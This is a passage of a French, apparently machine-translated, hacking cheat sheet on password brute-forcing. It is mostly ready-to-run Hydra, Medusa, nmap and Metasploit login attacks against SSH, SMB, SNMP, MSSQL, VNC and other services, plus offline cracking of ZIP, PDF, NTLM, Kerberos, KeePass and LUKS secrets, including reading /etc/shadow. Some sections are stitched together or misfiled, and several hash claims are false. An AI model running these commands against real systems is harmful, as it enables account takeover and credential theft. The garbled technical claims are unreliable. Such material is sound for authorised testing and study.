Pour éviter cela, il est recommandé d'utiliser SSH (Secure Shell) à la place de RSH. SSH est un protocole de communication réseau sécurisé qui utilise une méthode de cryptage pour protéger les informations d'identification de l'utilisateur lorsqu'elles sont envoyées sur le réseau.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

Le protocole RTSP (Real Time Streaming Protocol) est un protocole de contrôle utilisé pour la diffusion en continu de données audio et vidéo sur des réseaux IP. Il est souvent utilisé pour la diffusion en direct de vidéos de surveillance et de webcams. Les attaques de force brute contre les serveurs RTSP peuvent être utilisées pour tenter de deviner les noms d'utilisateur et les mots de passe, ainsi que pour identifier les flux vidéo disponibles. Les outils couramment utilisés pour les attaques de force brute RTSP incluent Hydra et Nmap.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

Le protocole SNMP (Simple Network Management Protocol) est utilisé pour gérer et surveiller les équipements réseau tels que les routeurs, les commutateurs et les serveurs. Il utilise une architecture client-serveur pour permettre aux administrateurs réseau de collecter des informations sur les équipements réseau et de les configurer à distance.

Les attaques par force brute contre SNMP sont généralement effectuées en utilisant des outils tels que SNMP-Brute ou SNMP-Dictionary. Ces outils tentent de deviner les chaînes de communauté SNMP (SNMP community strings) en envoyant des requêtes SNMP à l'équipement cible avec différentes chaînes de communauté. Si une chaîne de communauté correcte est devinée, l'attaquant peut accéder aux informations de l'équipement et potentiellement le compromettre.

Il est important de noter que de nombreux équipements réseau ont des chaînes de communauté SNMP par défaut, telles que "public" ou "private". Les administrateurs réseau doivent donc changer ces chaînes de communauté par défaut pour des chaînes plus complexes et difficiles à deviner.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

Le protocole SMB (Server Message Block) est utilisé pour le partage de fichiers et d'imprimantes entre des ordinateurs. Il est couramment utilisé dans les environnements Windows et peut être exploité pour effectuer des attaques de force brute.

#### Brute force sur SMB

L'attaque de force brute sur SMB consiste à essayer de deviner un nom d'utilisateur et un mot de passe valides pour accéder à un partage SMB. Les outils couramment utilisés pour cette attaque sont `smbclient`, `smbmap` et `enum4linux`.

##### `smbclient`

`smbclient` est un outil en ligne de commande qui permet de se connecter à un partage SMB et d'exécuter des commandes. Pour effectuer une attaque de force brute avec `smbclient`, vous pouvez utiliser la commande suivante :

```
for user in $(cat users.txt); do for pass in $(cat passwords.txt); do smbclient -U $user%$pass -L //target; done; done
```

Cette commande utilise deux fichiers texte, `users.txt` et `passwords.txt`, qui contiennent respectivement une liste de noms d'utilisateur et de mots de passe à essayer. La commande tente ensuite de se connecter à un partage SMB sur la cible en utilisant chaque combinaison nom d'utilisateur/mot de passe.

##### `smbmap`

`smbmap` est un outil en ligne de commande qui permet de scanner un réseau SMB et de lister les partages SMB disponibles. Pour effectuer une attaque de force brute avec `smbmap`, vous pouvez utiliser la commande suivante :

```
for user in $(cat users.txt); do for pass in $(cat passwords.txt); do smbmap -u $user -p $pass -H target; done; done
```

Cette commande utilise également deux fichiers texte, `users.txt` et `passwords.txt`, qui contiennent respectivement une liste de noms d'utilisateur et de mots de passe à essayer. La commande tente ensuite de se connecter à chaque partage SMB disponible sur la cible en utilisant chaque combinaison nom d'utilisateur/mot de passe.

##### `enum4linux`

`enum4linux` est un outil en ligne de commande qui permet de récupérer des informations sur un système Windows via SMB. Pour effectuer une attaque de force brute avec `enum4linux`, vous pouvez utiliser la commande suivante :

```
for user in $(cat users.txt); do for pass in $(cat passwords.txt); do enum4linux -u $user -p $pass target; done; done
```

Cette commande utilise également deux fichiers texte, `users.txt` et `passwords.txt`, qui contiennent respectivement une liste de noms d'utilisateur et de mots de passe à essayer. La commande tente ensuite de récupérer des informations sur le système cible en utilisant chaque combinaison nom d'utilisateur/mot de passe.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
### SMTP

SMTP (Simple Mail Transfer Protocol) est un protocole de communication utilisé pour transférer des courriels entre les serveurs de messagerie. Les attaquants peuvent utiliser des attaques de force brute pour deviner les identifiants de connexion SMTP valides et accéder aux comptes de messagerie. Les outils couramment utilisés pour les attaques de force brute SMTP incluent Hydra, Medusa et Ncrack. Il est important de noter que de nombreuses organisations limitent le nombre de tentatives de connexion SMTP pour éviter les attaques de force brute.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
### SOCKS

SOCKS (Socket Secure) est un protocole de réseau qui permet aux utilisateurs d'acheminer leur trafic Internet à travers un proxy. Les serveurs SOCKS peuvent être utilisés pour contourner les restrictions de pare-feu et de filtrage de contenu, ainsi que pour masquer l'adresse IP de l'utilisateur. Les attaquants peuvent également utiliser des serveurs SOCKS pour masquer leur adresse IP lorsqu'ils effectuent des activités malveillantes. Les outils de piratage tels que Nmap et Hydra prennent en charge l'utilisation de serveurs SOCKS pour masquer l'adresse IP de l'attaquant lorsqu'ils effectuent des scans de port et des attaques par force brute.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

#### Brute force

L'attaque par force brute est l'une des méthodes les plus courantes pour obtenir un accès non autorisé à un système distant via SSH. Cette attaque consiste à essayer de deviner le nom d'utilisateur et le mot de passe corrects en essayant différentes combinaisons jusqu'à ce que la bonne soit trouvée.

Il existe plusieurs outils pour effectuer des attaques par force brute sur SSH, tels que Hydra, Medusa, Ncrack, etc. Ces outils peuvent être utilisés pour tester la sécurité de votre propre système ou pour effectuer des attaques sur des systèmes tiers.

Il est important de noter que les attaques par force brute peuvent être détectées et bloquées par des mesures de sécurité telles que la limitation du nombre de tentatives de connexion, l'utilisation de mots de passe forts et la désactivation de l'authentification par mot de passe au profit de l'authentification par clé publique.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### Clés SSH faibles / PRNG prévisible de Debian
Certains systèmes ont des failles connues dans la graine aléatoire utilisée pour générer du matériel cryptographique. Cela peut entraîner une réduction considérable de l'espace de clés qui peut être bruteforcé avec des outils tels que [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Des ensembles de clés faibles pré-générées sont également disponibles, tels que [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### Serveur SQL
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

Telnet est un protocole de communication qui permet d'accéder à distance à un serveur ou à un ordinateur. Il est souvent utilisé pour administrer des équipements réseau tels que des routeurs, des commutateurs ou des pare-feu. Cependant, il est important de noter que Telnet transmet toutes les données, y compris les mots de passe, en texte clair, ce qui le rend vulnérable aux attaques de type "man-in-the-middle". Il est donc recommandé d'utiliser des protocoles de communication plus sécurisés tels que SSH.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC (Virtual Network Computing) est un protocole de bureau à distance qui permet à un utilisateur de contrôler à distance un ordinateur à partir d'un autre ordinateur ou d'un appareil mobile. Les serveurs VNC sont souvent utilisés pour fournir un accès à distance à des ordinateurs de bureau ou à des serveurs.

Les attaques de force brute contre les serveurs VNC sont courantes et peuvent être effectuées à l'aide d'outils tels que Hydra, Medusa ou Ncrack. Les attaquants peuvent utiliser des listes de mots de passe courants ou des dictionnaires de mots de passe pour tenter de deviner les informations d'identification d'un utilisateur.

Il est important de noter que l'utilisation de mots de passe forts et uniques est essentielle pour protéger les serveurs VNC contre les attaques de force brute. Les administrateurs système doivent également s'assurer que les serveurs VNC sont configurés de manière sécurisée et que les ports utilisés pour la communication VNC sont correctement protégés.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm est un protocole de gestion à distance pour les systèmes d'exploitation Windows. Il permet aux administrateurs système de gérer les serveurs Windows à distance. Winrm utilise le port 5985 pour les connexions HTTP et le port 5986 pour les connexions HTTPS. Les attaquants peuvent utiliser des attaques de force brute pour tenter de deviner les identifiants d'authentification et accéder à distance aux systèmes Windows vulnérables. Les outils couramment utilisés pour les attaques de force brute contre Winrm sont Hydra, Medusa et Ncrack.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
![](<../.gitbook/assets/image (9) (1) (2).png>)

Utilisez [**Trickest**](https://trickest.io/) pour créer et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Local

### Bases de données de craquage en ligne

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 et SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, captures WPA2 et archives MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes et hash de fichiers)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Vérifiez cela avant d'essayer de forcer un hash.

### ZIP
```bash
#sudo apt-get install fcrackzip 
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Attaque de texte clair connu sur les fichiers zip

Vous devez connaître le **texte clair** (ou une partie du texte clair) **d'un fichier contenu à l'intérieur** du fichier zip chiffré. Vous pouvez vérifier les **noms de fichiers et la taille des fichiers contenus à l'intérieur** d'un fichier zip chiffré en exécutant la commande suivante: **`7z l encrypted.zip`**\
Téléchargez [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)depuis la page des versions.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd 
unzip unlocked.zip #User new_pwd as password
```
### 7z

7z est un format de compression de fichiers open source qui est utilisé pour compresser et décompresser des fichiers. Il est souvent utilisé pour compresser des fichiers volumineux en un seul fichier plus petit. Les fichiers 7z peuvent être protégés par mot de passe pour empêcher l'accès non autorisé aux données qu'ils contiennent. Les attaquants peuvent utiliser des attaques de force brute pour tenter de deviner le mot de passe d'un fichier 7z protégé.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

Les fichiers PDF peuvent également être soumis à des attaques de force brute. Les outils tels que `pdfcrack` et `hashcat` peuvent être utilisés pour casser les mots de passe des fichiers PDF. Il est important de noter que les fichiers PDF peuvent également contenir des scripts malveillants, il est donc recommandé de ne pas ouvrir de fichiers PDF provenant de sources inconnues ou non fiables.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Mot de passe propriétaire PDF

Pour craquer un mot de passe propriétaire PDF, suivez ce lien : [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Craquage NTLM
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass est un gestionnaire de mots de passe open source qui permet de stocker en toute sécurité des informations sensibles telles que des mots de passe, des clés de chiffrement et des notes. Il utilise un algorithme de chiffrement avancé pour protéger les données stockées et nécessite un mot de passe principal pour accéder à la base de données. Keepass est disponible pour Windows, Linux et macOS, ainsi que pour les appareils mobiles. Il est également compatible avec les navigateurs Web pour remplir automatiquement les informations de connexion.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Le Keberoasting est une technique d'attaque qui consiste à extraire les informations d'identification des comptes de service Active Directory qui utilisent Kerberos pour l'authentification. Cette technique exploite une faiblesse dans le chiffrement Kerberos qui permet à un attaquant de récupérer les informations de hachage de mot de passe des comptes de service sans avoir besoin d'accéder à un compte d'utilisateur avec des privilèges élevés. Les informations de hachage de mot de passe peuvent ensuite être utilisées pour effectuer une attaque de force brute hors ligne pour récupérer le mot de passe en clair. 

Pour effectuer une attaque de Keberoasting, un attaquant doit d'abord identifier les comptes de service qui utilisent Kerberos pour l'authentification. Cela peut être fait en utilisant des outils tels que BloodHound ou PowerView pour cartographier les relations de confiance entre les comptes de service et les comptes d'utilisateur. Une fois que les comptes de service ont été identifiés, l'attaquant peut extraire les informations de hachage de mot de passe en utilisant des outils tels que Rubeus ou Mimikatz. 

Il est important de noter que le Keberoasting ne nécessite pas d'accès administratif au domaine ou à l'ordinateur cible. Cela signifie qu'un attaquant peut utiliser cette technique pour extraire des informations de hachage de mot de passe à partir d'un compte de service sans avoir besoin d'accéder à un compte d'utilisateur avec des privilèges élevés. Pour se protéger contre le Keberoasting, il est recommandé de désactiver les comptes de service qui ne sont pas nécessaires et de limiter les autorisations des comptes de service qui sont nécessaires.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Image Lucks

#### Méthode 1

Installation : [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Méthode 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
### Mysql

### MySQL
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Clé privée PGP/GPG
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### Clé maître DPAPI

Utilisez [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) puis john.

### Colonne protégée par mot de passe dans Open Office

Si vous avez un fichier xlsx avec une colonne protégée par un mot de passe, vous pouvez la déprotéger :

* **Téléchargez-le sur Google Drive** et le mot de passe sera automatiquement supprimé
* Pour le **supprimer manuellement** :
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certificats PFX
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
![](<../.gitbook/assets/image (9) (1) (2).png>)

Utilisez [**Trickest**](https://trickest.io/) pour construire et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Outils

**Exemples de hash :** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier
```bash
hash-identifier
> <HASH>
```
### Listes de mots

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Outils de génération de listes de mots**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Générateur de clavier avancé avec des caractères de base configurables, une carte de clavier et des itinéraires.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutation de John

Lire _**/etc/john/john.conf**_ et le configurer
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Attaques Hashcat

* **Attaque par liste de mots** (`-a 0`) avec des règles

**Hashcat** est déjà livré avec un **dossier contenant des règles**, mais vous pouvez trouver [**d'autres règles intéressantes ici**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Attaque de combinaison de listes de mots** 

Il est possible de **combiner 2 listes de mots en 1** avec hashcat.\
Si la liste 1 contenait le mot **"hello"** et la seconde contenait 2 lignes avec les mots **"world"** et **"earth"**. Les mots `helloworld` et `helloearth` seront générés.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Attaque par masque** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Attaque Wordlist + Masque (`-a 6`) / Masque + Wordlist (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Modes Hashcat

Les modes Hashcat
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Cracking Linux Hashes - fichier /etc/shadow

Le fichier `/etc/shadow` contient les mots de passe chiffrés des utilisateurs Linux. Pour les cracker, nous avons besoin d'extraire les hash des mots de passe et de les utiliser avec un outil de cracking de mots de passe.

## Extraire les hash des mots de passe

Pour extraire les hash des mots de passe, nous pouvons utiliser la commande `grep` pour extraire la ligne correspondant à l'utilisateur dont nous voulons cracker le mot de passe. Par exemple, pour extraire le hash du mot de passe de l'utilisateur `john`, nous pouvons utiliser la commande suivante :

```
grep '^john:' /etc/shadow | cut -d':' -f2
```

Cela renverra le hash du mot de passe de l'utilisateur `john`.

## Cracker les hash des mots de passe

Une fois que nous avons extrait le hash du mot de passe, nous pouvons utiliser un outil de cracking de mots de passe tel que `John the Ripper` pour cracker le mot de passe. Nous pouvons utiliser la commande suivante pour cracker le hash du mot de passe de l'utilisateur `john` :

```
john --wordlist=/path/to/wordlist.txt hash.txt
```

où `hash.txt` est le fichier contenant le hash du mot de passe que nous avons extrait précédemment et `/path/to/wordlist.txt` est le chemin vers notre liste de mots de passe.

Si le mot de passe est présent dans notre liste de mots de passe, `John the Ripper` le trouvera et nous le renverra.

## Conclusion

Le cracking de mots de passe Linux peut être un processus relativement simple si nous avons accès au fichier `/etc/shadow`. Cependant, il est important de noter que le cracking de mots de passe est illégal sans autorisation appropriée et peut entraîner des conséquences juridiques graves.
```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Craquage de Hashes Windows

## Introduction

Le craquage de hash est une technique courante utilisée pour récupérer des mots de passe à partir de leur version hachée. Dans ce chapitre, nous allons nous concentrer sur le craquage de hash Windows.

## Types de Hashes Windows

Windows utilise différents types de hash pour stocker les mots de passe. Les plus courants sont les suivants :

- **LM Hash** : utilisé dans les anciennes versions de Windows (avant Windows Vista) et considéré comme peu sûr car facilement craquable.
- **NTLM Hash** : utilisé dans les versions plus récentes de Windows (à partir de Windows Vista) et considéré comme plus sûr que le LM Hash.
- **NTLMv2 Hash** : une version améliorée du NTLM Hash, considérée comme encore plus sûre.

## Outils de Craquage de Hashes Windows

Il existe plusieurs outils de craquage de hash Windows, notamment :

- **John the Ripper** : un outil de craquage de hash open source qui prend en charge plusieurs types de hash Windows.
- **Hashcat** : un autre outil de craquage de hash open source qui prend en charge plusieurs types de hash Windows.
- **Cain and Abel** : un outil de récupération de mot de passe Windows qui peut également être utilisé pour craquer des hash Windows.

## Méthodes de Craquage de Hashes Windows

Les méthodes de craquage de hash Windows les plus courantes sont les suivantes :

- **Dictionnaire** : cette méthode consiste à utiliser un dictionnaire de mots de passe pour essayer de trouver une correspondance avec le hash.
- **Brute-Force** : cette méthode consiste à essayer toutes les combinaisons possibles de caractères jusqu'à ce que le hash soit craqué.
- **Rainbow Tables** : cette méthode consiste à utiliser une table précalculée de hash pour trouver une correspondance avec le hash à craquer.

## Conclusion

Le craquage de hash Windows peut être une tâche difficile, mais avec les bons outils et les bonnes méthodes, il est possible de récupérer des mots de passe à partir de leur version hachée. Il est important de noter que le craquage de hash peut être illégal dans certaines circonstances, il est donc important de l'utiliser de manière responsable et éthique.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Craquage des hachages d'applications courantes

## Introduction

Les hachages sont souvent utilisés pour stocker les mots de passe des utilisateurs dans les applications. Cependant, les hachages ne sont pas invulnérables et peuvent être craqués à l'aide de techniques de force brute. Dans ce document, nous allons examiner les techniques de craquage de hachages pour les applications courantes.

## Techniques de craquage de hachages

### MD5

MD5 est un algorithme de hachage couramment utilisé pour stocker les mots de passe des utilisateurs. Cependant, il est connu pour être vulnérable aux attaques de collision et peut être facilement craqué à l'aide de tables de hachage précalculées. Les tables de hachage précalculées sont des bases de données de hachages MD5 précalculés pour un grand nombre de mots de passe courants. Les attaquants peuvent utiliser ces tables pour trouver rapidement le mot de passe correspondant à un hachage MD5 donné.

### SHA-1

SHA-1 est un autre algorithme de hachage couramment utilisé pour stocker les mots de passe des utilisateurs. Cependant, il est également vulnérable aux attaques de collision et peut être facilement craqué à l'aide de tables de hachage précalculées. Les tables de hachage précalculées pour SHA-1 sont également disponibles en ligne et peuvent être utilisées pour trouver rapidement le mot de passe correspondant à un hachage SHA-1 donné.

### Bcrypt

Bcrypt est un algorithme de hachage plus sécurisé que MD5 et SHA-1. Il est conçu pour être résistant aux attaques de force brute en ralentissant le processus de hachage. Cependant, il peut toujours être craqué à l'aide de techniques de force brute si le mot de passe est suffisamment faible. Les attaquants peuvent également utiliser des tables de hachage précalculées pour Bcrypt, mais cela est beaucoup plus difficile en raison de la complexité de l'algorithme.

## Conclusion

Les hachages sont souvent utilisés pour stocker les mots de passe des utilisateurs dans les applications. Cependant, ils ne sont pas invulnérables et peuvent être craqués à l'aide de techniques de force brute. Il est important d'utiliser des algorithmes de hachage plus sécurisés comme Bcrypt pour protéger les mots de passe des utilisateurs.
```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```
<details>

